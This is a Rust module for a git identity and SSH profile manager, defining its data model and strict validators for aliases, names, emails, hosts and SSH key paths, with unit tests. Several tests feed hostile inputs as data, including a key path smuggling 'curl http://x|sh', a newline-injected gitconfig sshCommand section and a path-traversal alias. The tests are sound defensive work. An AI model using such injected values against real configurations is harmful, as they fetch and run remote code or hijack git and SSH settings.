//! Data model + input validation.
//!
//! Validation is strict on purpose: every one of these fields ends up either
//! in a generated config file or on an `ssh-keygen` command line, so a stray
//! newline or quote is a config-injection bug, not a cosmetic one.

use crate::error::{AppError, Result};
use crate::paths;
use serde::{Deserialize, Serialize};

pub const SCHEMA_VERSION: u32 = 1;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Profile {
    pub id: String,
    /// Short unique handle, e.g. `work`. Also names `~/.gitconfig-work`.
    pub alias: String,
    pub name: String,
    pub email: String,
    /// Real host the alias points at, e.g. `github.com`, `gitlab.com`.
    #[serde(default = "default_host_name")]
    pub host_name: String,
    /// SSH `Host` entry, e.g. `github.com-work`.
    pub host_alias: String,
    pub ssh_key_path: String,
    /// Folders this identity should apply to, via git `includeIf gitdir:`.
    #[serde(default)]
    pub dirs: Vec<String>,
    pub created_at: String,
    pub updated_at: String,
}

fn default_host_name() -> String {
    "github.com".to_string()
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ProfileInput {
    pub alias: String,
    pub name: String,
    pub email: String,
    #[serde(default = "default_host_name")]
    pub host_name: String,
    pub host_alias: String,
    pub ssh_key_path: String,
    #[serde(default)]
    pub dirs: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Settings {
    /// Folder whose effective git identity the tray reports.
    #[serde(default)]
    pub watched_dir: Option<String>,
    #[serde(default)]
    pub recent_dirs: Vec<String>,
    /// Profile used as the global `[user]` identity — the fallback for every
    /// repo that no `includeIf` folder rule covers. `None` leaves whatever is
    /// already in `~/.gitconfig` alone.
    #[serde(default)]
    pub global_profile_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Store {
    #[serde(default = "schema_version")]
    pub version: u32,
    #[serde(default)]
    pub profiles: Vec<Profile>,
    #[serde(default)]
    pub settings: Settings,
}

fn schema_version() -> u32 {
    SCHEMA_VERSION
}

impl Default for Store {
    fn default() -> Self {
        Store {
            version: SCHEMA_VERSION,
            profiles: Vec::new(),
            settings: Settings::default(),
        }
    }
}

impl Store {
    pub fn find(&self, id: &str) -> Result<&Profile> {
        self.profiles
            .iter()
            .find(|p| p.id == id)
            .ok_or_else(|| AppError::not_found(format!("no profile with id {id}")))
    }

    pub fn by_alias(&self, alias: &str) -> Option<&Profile> {
        self.profiles
            .iter()
            .find(|p| p.alias.eq_ignore_ascii_case(alias))
    }

    /// Profile whose email matches, case-insensitively — the lookup behind the
    /// tray's "which identity is this?" answer.
    pub fn by_email(&self, email: &str) -> Option<&Profile> {
        self.profiles
            .iter()
            .find(|p| p.email.eq_ignore_ascii_case(email))
    }
}

// ---------------------------------------------------------------- validation

fn reject_control_chars(field: &str, value: &str) -> Result<()> {
    if value.chars().any(|c| c.is_control()) {
        return Err(AppError::validation(format!(
            "{field} must not contain line breaks or control characters"
        )));
    }
    Ok(())
}

/// `alias` doubles as a filename component (`~/.gitconfig-<alias>`), so it is
/// restricted to a conservative charset with no separators or leading dot.
pub fn validate_alias(alias: &str) -> Result<String> {
    let alias = alias.trim();
    if alias.is_empty() {
        return Err(AppError::validation("alias is required"));
    }
    if alias.len() > 40 {
        return Err(AppError::validation("alias must be 40 characters or fewer"));
    }
    let first_ok = alias
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphanumeric());
    let rest_ok = alias
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
    if !first_ok || !rest_ok {
        return Err(AppError::validation(
            "alias may only contain letters, digits, '-' and '_', and must start with a letter or digit",
        ));
    }
    Ok(alias.to_string())
}

/// Hostnames and SSH host aliases share a charset; both are written verbatim
/// into `~/.ssh/config`, so whitespace and quotes are not allowed.
pub fn validate_host(field: &str, value: &str) -> Result<String> {
    let value = value.trim();
    if value.is_empty() {
        return Err(AppError::validation(format!("{field} is required")));
    }
    if value.len() > 253 {
        return Err(AppError::validation(format!("{field} is too long")));
    }
    if !value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_')
    {
        return Err(AppError::validation(format!(
            "{field} may only contain letters, digits, '.', '-' and '_'"
        )));
    }
    Ok(value.to_string())
}

pub fn validate_email(email: &str) -> Result<String> {
    let email = email.trim();
    reject_control_chars("email", email)?;
    if email.is_empty() {
        return Err(AppError::validation("email is required"));
    }
    if email.chars().any(char::is_whitespace) {
        return Err(AppError::validation("email must not contain spaces"));
    }
    let mut parts = email.split('@');
    let local = parts.next().unwrap_or_default();
    let domain = parts.next().unwrap_or_default();
    if parts.next().is_some() || local.is_empty() || domain.is_empty() {
        return Err(AppError::validation("email must look like name@example.com"));
    }
    if !domain.contains('.') || domain.starts_with('.') || domain.ends_with('.') {
        return Err(AppError::validation("email domain looks invalid"));
    }
    Ok(email.to_string())
}

pub fn validate_name(name: &str) -> Result<String> {
    let name = name.trim();
    reject_control_chars("name", name)?;
    if name.is_empty() {
        return Err(AppError::validation("name is required"));
    }
    if name.len() > 120 {
        return Err(AppError::validation("name must be 120 characters or fewer"));
    }
    Ok(name.to_string())
}

/// Characters an SSH key path may contain once `~` has been expanded.
///
/// Spaces and a mid-path `~` are deliberately allowed: real macOS paths carry
/// both (`~/Library/Mobile Documents/com~apple~CloudDocs/…`), and both emit
/// sites quote the value, so neither can change how the path is read. What is
/// excluded is everything a shell, ssh's `%`-token expansion, or ssh_config's
/// quoting could reinterpret — none of which has a legitimate use in a path.
fn ssh_path_char_ok(c: char) -> bool {
    c.is_alphanumeric() || matches!(c, '/' | '.' | '_' | '-' | '+' | '@' | '~' | ' ')
}

/// Validate an SSH key path and return the `~`-contracted form to store.
///
/// This path is embedded in `core.sshCommand`, which git executes through a
/// shell. [`fsx::sh_quote`](crate::fsx::sh_quote) is what actually makes that
/// safe; this is the second layer, so that a hostile value cannot even be
/// stored — `store::load` does not revalidate, and a future edit to the command
/// string should not be able to reopen the hole on its own.
pub fn validate_ssh_key_path(raw: &str) -> Result<String> {
    // Handles empty, control characters, relative paths, `..`, and escapes
    // outside $HOME. Reused rather than reimplemented.
    let path = paths::expand_within_home(raw)?;

    let text = path.to_str().ok_or_else(|| {
        AppError::validation("key path contains characters this app cannot read")
    })?;
    if text.len() > 512 {
        return Err(AppError::validation(
            "key path must be 512 characters or fewer",
        ));
    }
    if let Some(bad) = text.chars().find(|c| !ssh_path_char_ok(*c)) {
        return Err(AppError::validation(format!(
            "key path may not contain '{}' — use letters, digits, and '/._-+@~'",
            bad.escape_default()
        )));
    }

    let file_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| AppError::validation("key path must name a file"))?;
    if file_name.ends_with(".pub") {
        return Err(AppError::validation(
            "point this at the private key, not the .pub file",
        ));
    }

    // Generating a key with overwrite deletes whatever is already at this path.
    // None of these is a key, and losing any of them would be someone's bad day.
    let reserved = [
        paths::ssh_config_path()?,
        paths::home()?.join(".ssh/known_hosts"),
        paths::home()?.join(".ssh/authorized_keys"),
        paths::gitconfig_path()?,
        paths::store_path()?,
        paths::home()?,
    ];
    if reserved.contains(&path) {
        return Err(AppError::validation(format!(
            "{} is not a key file — generating one here would destroy it",
            paths::contract(&path)
        )));
    }

    Ok(paths::contract(&path))
}

/// Normalized, validated form of a [`ProfileInput`].
pub struct CleanInput {
    pub alias: String,
    pub name: String,
    pub email: String,
    pub host_name: String,
    pub host_alias: String,
    pub ssh_key_path: String,
    pub dirs: Vec<String>,
}

impl ProfileInput {
    pub fn clean(&self) -> Result<CleanInput> {
        let alias = validate_alias(&self.alias)?;
        let name = validate_name(&self.name)?;
        let email = validate_email(&self.email)?;
        let host_name = validate_host("host", &self.host_name)?;
        let host_alias = validate_host("SSH host alias", &self.host_alias)?;

        // Keys must sit under $HOME; ssh(1) will not read them from anywhere
        // exotic anyway, and it keeps the writable surface small.
        let ssh_key_path = validate_ssh_key_path(&self.ssh_key_path)?;

        let mut dirs = Vec::new();
        for dir in &self.dirs {
            if dir.trim().is_empty() {
                continue;
            }
            let expanded = paths::expand(dir)?;
            let contracted = paths::contract(&expanded);
            if !dirs.contains(&contracted) {
                dirs.push(contracted);
            }
        }

        Ok(CleanInput {
            alias,
            name,
            email,
            host_name,
            host_alias,
            ssh_key_path,
            dirs,
        })
    }
}

pub fn now_iso() -> String {
    chrono::Utc::now().to_rfc3339()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ssh_key_path_rejects_shell_metacharacters() {
        // This path is embedded in core.sshCommand, which git runs through a
        // shell. Anything the shell could reinterpret has no business here.
        for c in [
            ';', '|', '&', '$', '`', '(', ')', '<', '>', '*', '?', '!', '#', '"', '\'', '\\', '%',
            '{', '}', '[', ']', '^', '=', ':', ',', '\t',
        ] {
            let candidate = format!("~/.ssh/id{c}x");
            assert!(
                validate_ssh_key_path(&candidate).is_err(),
                "{candidate:?} must be rejected"
            );
        }
        // The payload this validator exists to stop.
        assert!(validate_ssh_key_path("~/.ssh/id;curl http://x|sh").is_err());
    }

    #[test]
    fn ssh_key_path_allows_real_world_paths() {
        // Deliberate: both emit sites quote the value, so a space cannot change
        // how it is read, and banning it would reject paths people really have.
        // Do not "harden" this into rejecting them.
        assert!(validate_ssh_key_path("~/.ssh/id_ed25519").is_ok());
        assert!(validate_ssh_key_path("~/My Keys/id_ed25519").is_ok());
        assert!(
            validate_ssh_key_path("~/Library/Mobile Documents/com~apple~CloudDocs/id").is_ok(),
            "iCloud paths carry both a space and a mid-path '~'"
        );
        assert!(validate_ssh_key_path("~/.ssh/id_josé").is_ok());
        assert!(validate_ssh_key_path("~/.ssh/id+work@host").is_ok());
    }

    #[test]
    fn ssh_key_path_refuses_to_target_something_precious() {
        // Generating with overwrite deletes whatever is already at this path.
        assert!(validate_ssh_key_path("~/.ssh/config").is_err());
        assert!(validate_ssh_key_path("~/.ssh/known_hosts").is_err());
        assert!(validate_ssh_key_path("~/.ssh/authorized_keys").is_err());
        assert!(validate_ssh_key_path("~/.gitconfig").is_err());
        assert!(validate_ssh_key_path("~").is_err());
    }

    #[test]
    fn ssh_key_path_keeps_the_rules_it_already_had() {
        assert!(validate_ssh_key_path("").is_err());
        assert!(validate_ssh_key_path("relative/id").is_err());
        assert!(validate_ssh_key_path("~/../outside/id").is_err());
        assert!(validate_ssh_key_path("/etc/id").is_err());
        assert!(validate_ssh_key_path("~/.ssh/id.pub").is_err());
        // Stored in the portable ~ form, not as an absolute path.
        assert_eq!(
            validate_ssh_key_path("~/.ssh/id_work").unwrap(),
            "~/.ssh/id_work"
        );
    }

    #[test]
    fn alias_charset_is_enforced() {
        assert!(validate_alias("work").is_ok());
        assert!(validate_alias("client-x_2").is_ok());
        assert!(validate_alias("").is_err());
        assert!(validate_alias("-leading").is_err());
        assert!(validate_alias("has space").is_err());
        // Would let an alias escape into another directory via the
        // ~/.gitconfig-<alias> filename.
        assert!(validate_alias("../../etc/passwd").is_err());
        assert!(validate_alias("a/b").is_err());
    }

    #[test]
    fn names_may_not_smuggle_config_directives() {
        // A newline here would inject a section into ~/.gitconfig-<alias>.
        assert!(validate_name("Real Name\n[core]\n\tsshCommand = evil").is_err());
        assert!(validate_name("Real Name").is_ok());
    }

    #[test]
    fn email_rules() {
        assert!(validate_email("me@example.com").is_ok());
        assert!(validate_email("me@example").is_err());
        assert!(validate_email("me@@example.com").is_err());
        assert!(validate_email("no-at-sign").is_err());
        assert!(validate_email("me @example.com").is_err());
        assert!(validate_email("me@example.com\nx").is_err());
    }

    #[test]
    fn host_values_reject_whitespace_and_quotes() {
        assert!(validate_host("host", "github.com").is_ok());
        assert!(validate_host("host", "github.com-work").is_ok());
        assert!(validate_host("host", "git hub.com").is_err());
        assert!(validate_host("host", "github.com\n  User root").is_err());
    }

    #[test]
    fn a_store_written_before_the_global_setting_existed_still_loads() {
        // Exactly the shape v0.1.0 wrote: no globalProfileId anywhere.
        let raw = r#"{
            "version": 1,
            "profiles": [{
                "id": "abc",
                "alias": "personal",
                "name": "Me",
                "email": "me@example.com",
                "hostName": "github.com",
                "hostAlias": "gh-personal",
                "sshKeyPath": "~/.ssh/id_ed25519_personal",
                "dirs": ["~/code"],
                "createdAt": "2026-09-11T00:00:00Z",
                "updatedAt": "2026-09-11T00:00:00Z"
            }],
            "settings": { "watchedDir": "~/code", "recentDirs": ["~/code"] }
        }"#;

        let store: Store = serde_json::from_str(raw).expect("old stores must keep loading");
        assert_eq!(store.profiles.len(), 1);
        assert_eq!(store.settings.watched_dir.as_deref(), Some("~/code"));
        assert_eq!(store.settings.global_profile_id, None);
    }

    #[test]
    fn lookup_by_email_ignores_case() {
        let store = Store {
            version: SCHEMA_VERSION,
            profiles: vec![Profile {
                id: "1".into(),
                alias: "work".into(),
                name: "Me".into(),
                email: "Me@Example.com".into(),
                host_name: "github.com".into(),
                host_alias: "github.com-work".into(),
                ssh_key_path: "~/.ssh/id_work".into(),
                dirs: vec![],
                created_at: now_iso(),
                updated_at: now_iso(),
            }],
            settings: Settings::default(),
        };
        assert_eq!(store.by_email("me@example.com").unwrap().alias, "work");
        assert!(store.by_email("other@example.com").is_none());
    }
}
